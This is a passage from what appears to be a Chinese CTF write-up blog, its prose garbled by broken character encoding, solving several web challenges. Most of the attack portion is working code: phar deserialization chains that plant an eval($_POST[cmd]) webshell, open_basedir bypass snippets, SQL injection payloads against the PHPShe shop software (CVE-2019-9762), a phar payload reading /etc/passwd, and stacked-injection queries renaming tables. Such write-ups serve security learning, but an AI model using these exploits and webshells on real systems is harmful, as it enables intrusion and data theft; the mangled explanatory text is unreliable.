<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">      <span class="keyword">public</span> $userdir;</span><br><span class="line">      <span class="keyword">public</span> $filename;</span><br><span class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">'/var/www/html/45f6a4a57549a572/upload/adeee0c170ad4ffb110df0cde294aecd/shell'</span>;<span class="comment">//è¿™é‡Œä¸éœ€è¦åŠ åç¼€</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;userdir = <span class="string">'aaaaaaaaaaa&lt;?php phpinfo();eval($_POST[cmd]);?&gt;aaaaaaa'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = <span class="keyword">new</span> dir();</span><br><span class="line">    <span class="comment">// var_dump($a);</span></span><br><span class="line">    @unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line">    $phar-&gt;setMetadata($a); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">    <span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å‰åçå‡‘çš„å­—ç¬¦ä¸²ä¸ºäº†ç»•è¿‡è¿‡æ»¤</p>
<img src="/2020/08/06/remaining/5.png" class="">

<p>åˆ°è¿™é‡Œèƒ½è®¿é—®å°±èƒ½çœ‹åˆ°phpinfoé¡µé¢äº†ï¼Œä½†æ˜¯ç¯å¢ƒé—®é¢˜æ²¡æˆåŠŸï¼Œé‚£ä¸ªä¸Šä¼ åçš„ç›®å½•ä¸èƒ½è®¿é—®</p>
<p>æœ€åè¿˜æœ‰ä¸€æ­¥å°±æ˜¯ç»•è¿‡<code>open_basedirå’Œdisable_function</code></p>
<p>ç›´æ¥ç”¨èšå‰‘çš„æ’ä»¶å°±èƒ½ç»•è¿‡æ‹¿åˆ°flagäº†ï¼Œè¿™é‡Œå°±æ²¡å›¾èƒ½è´´äº†ï¼Œæˆ–è€…æ˜¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);var_dump(scandir(<span class="string">'/'</span>));</span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>, <span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>, <span class="string">'/'</span>);var_dump(show_source(<span class="string">'/F1aG_1s_H4r4'</span>));</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥æ‹¿åˆ°flagï¼Œé‚£è¿™é¢˜å°±åˆ°è¿™äº†ï¼Œå­¦åˆ°ä¸œè¥¿æ‰æ˜¯çœŸï¼Œflagä¸é‡è¦(233333)</p>
<h2 id="RoarCTF-2019-PHPShe"><a href="#RoarCTF-2019-PHPShe" class="headerlink" title="[RoarCTF 2019]PHPShe"></a>[RoarCTF 2019]PHPShe</h2><h2 id="çŸ¥è¯†ç‚¹-2"><a href="#çŸ¥è¯†ç‚¹-2" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><ul>
<li>æ— åˆ—åæ³¨å…¥</li>
<li>pharååºåˆ—åŒ–</li>
<li>ä»£ç å®¡è®¡</li>
<li>è·å–token</li>
</ul>
<h2 id="è§£é¢˜æ­¥éª¤-2"><a href="#è§£é¢˜æ­¥éª¤-2" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h2><p>é¢˜ç›®ç»™äº†æºç ï¼Œç›´æ¥ä¸‹è½½</p>
<p>å¼€é¢˜ï¼Œphpsheä¸€ä¸ªå•†æˆ·æ¡†æ¶ï¼ŒæŸ¥ä¸€ä¸‹CVE(<a href="https://anquan.baidu.com/article/697" target="_blank" rel="noopener">https://anquan.baidu.com/article/697</a>)</p>
<p>æ¯”è¾ƒæºç ï¼ŒXXE<strong>ï¼ˆCVE-2019-9761ï¼‰</strong>å› ä¸ºåˆ é™¤äº†notify_url.phpè¿™ä¸ªæ–‡ä»¶ï¼Œä¸èƒ½ç”¨</p>
<p>çœ‹ä¸€ä¸‹<strong>æ— é™åˆ¶SQLæ³¨å…¥åˆ†æï¼ˆCVE-2019-9762ï¼‰</strong>ï¼Œè·Ÿç€æ–‡ç« ä¸€æ­¥æ­¥çœ‹ï¼Œç›´æ¥çœ‹é‡ç‚¹</p>
<p>æ¼æ´åˆ©ç”¨ç‚¹çš„å…¥å£åœ¨include/plugin/payment/alipay/pay.phpï¼Œè¿™é‡Œæ˜¯å”¯ä¸€æœ‰å›æ˜¾çš„ä½ç½®ï¼Œpocï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">/include/plugin/payment/alipay/pay.php?id=pay`%20where%201=1%20union%20select%201,2,user(),4,5,6,7,8,9,10,11,12%23_</span><br></pre></td></tr></table></figure>

<img src="/2020/08/06/remaining/6.png" class="">

<p>å› ä¸ºè¿‡æ»¤äº†ä¸‹åˆ’çº¿ï¼Œè¿™é‡Œè¦ç”¨åˆ°æ— åˆ—åæ³¨å…¥</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">/include/plugin/payment/alipay/pay.php?id=pay`%20where%201=1%20union%20select%201,2,(<span class="keyword">select</span><span class="string">`3`</span><span class="keyword">from</span>(<span class="keyword">select</span>%<span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>%<span class="number">20</span><span class="keyword">union</span>%<span class="number">20</span><span class="keyword">select</span>%<span class="number">20</span>*%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span><span class="keyword">admin</span>)a%<span class="number">20</span><span class="keyword">limit</span>%<span class="number">201</span>,<span class="number">1</span>),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>%<span class="number">23</span>_</span><br></pre></td></tr></table></figure>

<img src="/2020/08/06/remaining/7.png" class="">

<p>æ‹¿åˆ°MD5åŠ å¯†åçš„å¯†ç ï¼Œè§£å¯†å¾—åˆ°admin/altman777ï¼Œç™»å½•åå°</p>
<p>åœ¨å“ç‰Œç®¡ç†å¤„å‘ç°å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œè¿™é‡Œå› ä¸ºå°±æ˜¯åˆ©ç”¨ç‚¹äº†</p>
<img src="/2020/08/06/remaining/8.png" class="">

<p>æœ¬é¢˜ç›®çš„æºä»£ç åœ¨<code>/include/class/pclzip.class.php</code>å¤šäº†ä¸ªææ„é­”æœ¯æ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;extract(PCLZIP_OPT_PATH, <span class="keyword">$this</span>-&gt;save_path);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>è·Ÿè¿›ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œåœ¨<code>module/admin/moban.php</code></p>
<img src="/2020/08/06/remaining/9.png" class="">

<p>è¿™ä¸ªç±»èµ·åˆ°è§£å‹ç¼©çš„ä½œç”¨ï¼Œé‚£ä¹ˆåº”è¯¥ä¼šç”¨åˆ°pharåè®®</p>
<p>åŒæ—¶ï¼Œåœ¨moban.phpä¸­å¯ä»¥çœ‹åˆ°ï¼Œå¼•ç”¨äº†<code>pclzip.class.php</code></p>
<img src="/2020/08/06/remaining/10.png" class="">

<p>ç»§ç»­å¾€ä¸‹çœ‹ï¼Œçœ‹åˆ°äº†delæ–¹æ³•</p>
<img src="/2020/08/06/remaining/11.png" class="">

<p>è·Ÿè¿›ä¸€ä¸‹pe_dirdelæ–¹æ³•</p>
<img src="/2020/08/06/remaining/12.png" class="">

<p>çœ‹åˆ°äº†is_fileï¼Œé‚£ä¹ˆpharçš„è§¦å‘ç‚¹å°±æ‰¾åˆ°äº†</p>
<p>æ€è·¯æ¸…æ™°äº†ï¼Œé€šè¿‡moban.phpçš„delåŠŸèƒ½ä¼ å…¥<strong>tpl</strong>å‚æ•°ï¼Œé€šè¿‡<strong>is_file</strong>å‡½æ•°è§¦å‘<strong>pharååºåˆ—åŒ–</strong>ï¼Œå¯¹ä¹‹å‰ä¸Šä¼ çš„åŒ…å«shellçš„zipæ–‡ä»¶è¿›è¡Œè§£å‹ç¼©å¾—åˆ°shell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PclZip</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $zipname = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $zip_fd = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> $error_code = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> $error_string = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $magic_quotes_status;</span><br><span class="line">    <span class="keyword">var</span> $save_path;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($p_zipname)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;zipname = $p_zipname;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;zip_fd = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;magic_quotes_status = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$f=<span class="keyword">new</span> PclZip(<span class="string">"/var/www/html/data/attachment/brand/5.zip"</span>);</span><br><span class="line">$f-&gt;save_path=<span class="string">'/var/www/html/data'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($f);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span>,<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($f);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>ä¸»è¦çš„å‚æ•°å°±æ˜¯ä¸Šä¼ çš„shellè·¯å¾„ä»¥åŠä¿å­˜çš„è·¯å¾„</strong></p>
<p>ä¸Šä¼ è·¯å¾„åœ¨ä¸Šä¼ ä¹‹åèƒ½å¤Ÿçœ‹åˆ°</p>
<img src="/2020/08/06/remaining/13.png" class="">

<p>ä¸Šä¼ å°ğŸä¹‹åä¿®æ”¹expä¸­çš„è·¯å¾„å³å¯</p>
<p>ä¹‹åå†ä¸Šä¼ pharæ–‡ä»¶ï¼ŒæŠ“åŒ…ä¿®æ”¹æ–‡ä»¶åä¸º1.txt</p>
<p>è¿™é‡Œè¿˜è¦æ³¨æ„çš„ç‚¹å°±æ˜¯tokençš„è·å–ï¼Œtokenåœ¨å¤‡ä»½çš„æ•°æ®åº“æ¢å¤æ—¶èƒ½å¤Ÿè·å–å¾—åˆ°</p>
<img src="/2020/08/06/remaining/14.png" class="">

<p>è¿™æ ·ä¸€æ¥tokenå°±åˆ°æ‰‹äº†ï¼Œä¹‹åå†å¸¦ä¸Šreferer</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Referer:http://c9ef4168-ae76-49ee-aa39-1808fc8dfd36.node3.buuoj.cn/admin.php?mod=moban</span><br></pre></td></tr></table></figure>

<p>è¿›è¡Œåˆ é™¤æ“ä½œæ¥è§£å‹ç¼©ä¸Šä¼ çš„å°ğŸå‹ç¼©åŒ…</p>
<img src="/2020/08/06/remaining/15.png" class="">

<p>ä¸‹é¢å°±èƒ½è®¿é—®dataä¸‹çš„å°ğŸæ–‡ä»¶äº†ï¼Œè¯»å–ä¸€ä¸‹æ ¹ç›®å½•æ‰¾åˆ°flagæ–‡ä»¶ï¼Œå†è¯»å–å†…å®¹</p>
<img src="/2020/08/06/remaining/16.png" class="">

<h2 id="Phuck2"><a href="#Phuck2" class="headerlink" title="Phuck2"></a>Phuck2</h2><h3 id="çŸ¥è¯†ç‚¹-3"><a href="#çŸ¥è¯†ç‚¹-3" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul>
<li>DATA URL</li>
<li>file_get_contentså’Œincludeå¤„ç†dataï¼šç‰¹æ€§</li>
</ul>
<h2 id="è§£é¢˜æ­¥éª¤-3"><a href="#è§£é¢˜æ­¥éª¤-3" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h2><p>è¿™é¢˜æ‰“å¼€å…¨æ˜¯ç™½çš„ï¼Œä¸çŸ¥é“æ€ä¹ˆæ•´ï¼Œçœ‹äº†æºç è¦ä¼ å…¥hlå‚æ•°æ‰èƒ½çœ‹åˆ°æºç ï¼Œè¿™è°æƒ³å¾—åˆ°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    stream_wrapper_unregister(<span class="string">'php'</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'hl'</span>])) highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    $mkdir = <span class="function"><span class="keyword">function</span><span class="params">($dir)</span> </span>&#123;</span><br><span class="line">        system(<span class="string">'mkdir -- '</span>.escapeshellarg($dir));</span><br><span class="line">    &#125;;</span><br><span class="line">    $randFolder = bin2hex(random_bytes(<span class="number">16</span>));</span><br><span class="line">    $mkdir(<span class="string">'users/'</span>.$randFolder);</span><br><span class="line">    chdir(<span class="string">'users/'</span>.$randFolder);</span><br><span class="line">    $userFolder = (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]) ? $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] : $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    $userFolder = basename(str_replace([<span class="string">'.'</span>,<span class="string">'-'</span>],[<span class="string">''</span>,<span class="string">''</span>],$userFolder));</span><br><span class="line">    $mkdir($userFolder);</span><br><span class="line">    chdir($userFolder);</span><br><span class="line">    file_put_contents(<span class="string">'profile'</span>,print_r($_SERVER,<span class="keyword">true</span>));</span><br><span class="line">    chdir(<span class="string">'..'</span>);</span><br><span class="line">    $_GET[<span class="string">'page'</span>]=str_replace(<span class="string">'.'</span>,<span class="string">''</span>,$_GET[<span class="string">'page'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!stripos(file_get_contents($_GET[<span class="string">'page'</span>]),<span class="string">'&lt;?'</span>) &amp;&amp; !stripos(file_get_contents($_GET[<span class="string">'page'</span>]),<span class="string">'php'</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span>($_GET[<span class="string">'page'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    chdir(<span class="keyword">__DIR__</span>);</span><br><span class="line">    system(<span class="string">'rm -rf users/'</span>.$randFolder);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸€å¼€å§‹å°±banæ‰äº†phpæ•°æ®æµï¼Œåé¢çš„escapeshellargè¿‡æ»¤äº†ä¼ å…¥çš„å‚æ•°ï¼Œç»•ä¸è¿‡</p>
<p>æ¥ç€å¾€ä¸‹èµ°ï¼Œ<code>X-Forwarded-For</code>å¤´ä¸­çš„ç›®å½•åä¼šèµ‹å€¼ç»™$userFolderï¼Œå¹¶ä¸”è¿‡æ»¤äº†.å’Œ-,ä¸‹é¢å°†æ•°æ®å†™å…¥äº†$userFolder/profileä¸­ï¼Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œåœ¨$pageä¸­è¿‡æ»¤äº†ç‚¹å·ï¼Œçœ‹åˆ°äº†includeåº”è¯¥æ˜¯åŒ…å«äº†ï¼Œä¸è¿‡è¿™é‡Œåˆè¿‡æ»¤äº†<code>&lt;?</code>å’Œ<code>php</code></p>
<p>é‡ç‚¹æ¥äº†ï¼Œå…³äº include ä¸ file_get_contentså¯¹Data URI å¤„ç†ä¸Šçš„é—®é¢˜</p>
<p>è‡ªå·±å°å°æµ‹è¯•ä¸€æŠŠ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">print</span>(<span class="keyword">include</span>(<span class="string">"data:,profile"</span>));</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">	<span class="keyword">print</span>(file_get_contents(<span class="string">"data:,profile"</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2020/08/06/remaining/17.png" class="">

<p>å¯ä»¥çœ‹åˆ°<code>file_get_content()</code>æ­£å¸¸è¿”å›ï¼Œ<code>include()</code>æŠ¥é”™ï¼Œè¿™é‡Œå¿˜è®°è¯´äº†ï¼Œå½“æ—¶çš„æ¯”èµ›åº”è¯¥ç»™äº†hintï¼Œ<code>allow_url_include = Off,allow_url_fopen = On</code></p>
<p>åœ¨è¿™ç§æƒ…å†µä¸‹è¦æ€ä¹ˆåšå‘¢ï¼Œè¿™å°±æ˜¯<code>include()</code>åœ¨ä¸å…è®¸åŒ…å«çš„æƒ…å†µä¸‹ï¼Œå¦‚æœè¯´DATA URLæ˜¯ä¸ªç›®å½•æ–‡ä»¶å°±å¯ä»¥ç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">print</span>(<span class="keyword">include</span>(<span class="string">"data:,123456/profile"</span>));</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">	<span class="keyword">print</span>(file_get_contents(<span class="string">"data:,123456/profile"</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2020/08/06/remaining/18.png" class="">

<p>å¯ä»¥çœ‹åˆ°æ­£å¸¸åŒ…å«äº†ï¼Œè¿”å›äº†1</p>
<p>è¿™é‡Œå°±å¯ä»¥è¿™æ ·åšäº†</p>
<img src="/2020/08/06/remaining/19.png" class="">

<p>ä¸‹é¢åªéœ€è¦æ›´æ”¹å†™å…¥çš„å†…å®¹æ‰§è¡Œä»£ç ï¼Œè¿™é‡Œä¸ç”¨catè¯»å–å†…å®¹ï¼Œç›´æ¥å¦‚å›¾ä¸­æ‰€ç¤ºå³å¯</p>
<img src="/2020/08/06/remaining/20.png" class="">

<h2 id="Chaos-Communication-Camp-2019-PDFCreator"><a href="#Chaos-Communication-Camp-2019-PDFCreator" class="headerlink" title="[Chaos Communication Camp 2019]PDFCreator"></a>[Chaos Communication Camp 2019]PDFCreator</h2><h3 id="çŸ¥è¯†ç‚¹-4"><a href="#çŸ¥è¯†ç‚¹-4" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul>
<li>pharååºåˆ—åŒ–</li>
<li>/etc/nginx/nginx.confé…ç½®ä¿¡æ¯</li>
</ul>
<h3 id="è§£é¢˜æ­¥éª¤-4"><a href="#è§£é¢˜æ­¥éª¤-4" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>ç›´æ¥çœ‹ç»™çš„æºç ï¼Œdownä¸€ä»½ä¸‹æ¥</p>
<p>åœ¨index.phpä¸­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"pdfcontent"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	$creator = <span class="keyword">new</span> \PDFStuff\PDFCreator();</span><br><span class="line">	$creator-&gt;createPdf($_POST[<span class="string">"pdfcontent"</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨PDFStuffå‘½åç©ºé—´ä¸‹æœ‰ä¸€ä¸ªPDFCreatorç±»ï¼Œè·Ÿä¸€ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PDFStuff</span></span><br><span class="line">&#123;</span><br><span class="line">include 'TCPDF/tcpdf.php';</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PDFCreator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> $tmpfile;</span><br><span class="line">   <span class="keyword">public</span> $finalfile;</span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (file_exists(<span class="keyword">$this</span>-&gt;tmpfile))</span><br><span class="line">   &#123;</span><br><span class="line">   $info = pathinfo(<span class="keyword">$this</span>-&gt;tmpfile);</span><br><span class="line">   <span class="keyword">if</span> ($info[<span class="string">'extension'</span>] == <span class="string">"pdf"</span>)</span><br><span class="line">   &#123;</span><br><span class="line">   unlink(<span class="keyword">$this</span>-&gt;tmpfile);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Could not delete created PDF: Not a pdf. Check the file: "</span> . file_get_contents(<span class="keyword">$this</span>-&gt;tmpfile);</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°<em>\</em>destruct()é­”æœ¯æ–¹æ³•ä¸­åœ¨åˆ¤æ–­æ–‡ä»¶å­˜åœ¨å¹¶ä¸”ä¸æ˜¯pdfæ–‡ä»¶åï¼Œä¼šåŒ…å«è¿™ä¸ªæ–‡ä»¶è¯»å–å†…å®¹ï¼Œè¿™é‡Œå°±æƒ³åˆ°äº†pharåè®®</p>
<p>åˆ©ç”¨ç‚¹åœ¨</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Converted by CoolPDF<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">h3</span>&gt;</span>We hope you enjoyed our service!<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"phar://./upload/d7f4be9d064bac5fd42207b3d7efe102_10.jpg"</span> <span class="attr">width</span>=<span class="string">"10"</span> <span class="attr">height</span>=<span class="string">"10"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>srcè¿™é‡Œå¯ä»¥åˆ©ç”¨phar://æ¥è¿›è¡Œè§£æ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PDFStuff</span>&#123;</span><br><span class="line">        <span class="title">class</span> <span class="title">PDFCreator</span>&#123;</span><br><span class="line">                public $tmpfile='/etc/passwd';</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">$<span class="title">a</span>=<span class="title">new</span> \<span class="title">PDFStuff</span>\<span class="title">PDFCreator</span>();</span><br><span class="line">@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar=<span class="keyword">new</span> \Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">'GIF89a'</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($a);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2020/08/06/remaining/21.png" class="">

<p>è¿™é‡Œè¦æ³¨æ„å¾—æ˜¯webæœåŠ¡ç›®å½•ä¸æ˜¯/var/www/html,å¾—è¯»å–nginxé…ç½®ä¿¡æ¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</span><br></pre></td></tr></table></figure>

<img src="/2020/08/06/remaining/22.png" class="">

<p>å¾—åˆ°æ ¹ç›®å½•æ˜¯<code>/var/www/site</code></p>
<p>è¯»å–ä¹‹å‰æ‰«åˆ°å¾—flag.phpå³å¯</p>
<img src="/2020/08/06/remaining/23.png" class="">

]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>sql1</title>
    <url>/2020/01/12/sql1/</url>
    <content><![CDATA[<p>å¼ºç½‘æ¯2019 webéšä¾¿æ³¨</p>
<p>return preg_match<a id="more"></a>(â€œ/select|update|delete|drop|insert|where|./iâ€,$inject);è¿‡æ»¤äº†æ‹¬å·å†…çš„ä¸œè¥¿<br>?a=1#è¿”å›æ­£å¸¸</p>
<p>è€ƒè™‘ç”¨å †å æ³¨å…¥</p>
<p>å †å æŸ¥è¯¢ <code>id=1&#39;;show databases;</code>â€˜çˆ†å‡ºæ•°æ®åº“å†…å®¹<br><code>id=1&#39;;show tables;&#39;</code>çˆ†å‡ºæ‰€æœ‰è¡¨å</p>
<p>1.å› ä¸ºalert,renameæ²¡æœ‰è¢«è¿‡æ»¤ï¼Œå¯ä»¥æ”¹å˜è¡¨å</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">`/?inject=1'; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);*#*</span><br><span class="line">æ‹†å¼€æ¥ï¼š</span><br><span class="line">1';</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">rename</span> <span class="keyword">to</span> words1;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">rename</span> <span class="keyword">to</span> words;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">change</span> flag <span class="keyword">id</span> <span class="built_in">varchar</span>(<span class="number">50</span>);</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>æœ€åç›´æ¥é€šè¿‡1â€™orâ€™1â€™=â€™1å¯ä»¥çˆ†å‡ºflag</p>
<p>2.é¢„ç¼–è¯‘ï¼š16è¿›åˆ¶ç»•è¿‡</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1';</span><br><span class="line"><span class="keyword">SeT</span>@a=<span class="number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;</span><br><span class="line"><span class="keyword">prepare</span> execsql <span class="keyword">from</span> @a;</span><br><span class="line"><span class="keyword">execute</span> execsql;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>å †å æ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>ssrf</title>
    <url>/2020/01/16/ssrf/</url>
